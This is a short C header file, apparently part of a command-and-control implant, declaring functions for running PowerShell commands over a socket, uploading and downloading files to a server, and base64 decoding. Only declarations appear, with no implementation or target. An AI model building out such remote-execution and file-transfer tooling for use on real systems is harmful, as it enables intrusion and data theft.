#ifndef UTILS_H
#define UTILS_H

#include "c2.h"

int psh_exec(sock_t sock, const char *cmd);
void upload_file_to_server(sock_t sock, char* remote_path);
void download_file_from_server(sock_t sock, char *remote_path);
int b64_decode(const char *in, unsigned char *out);

#endif /* UTILS_H */
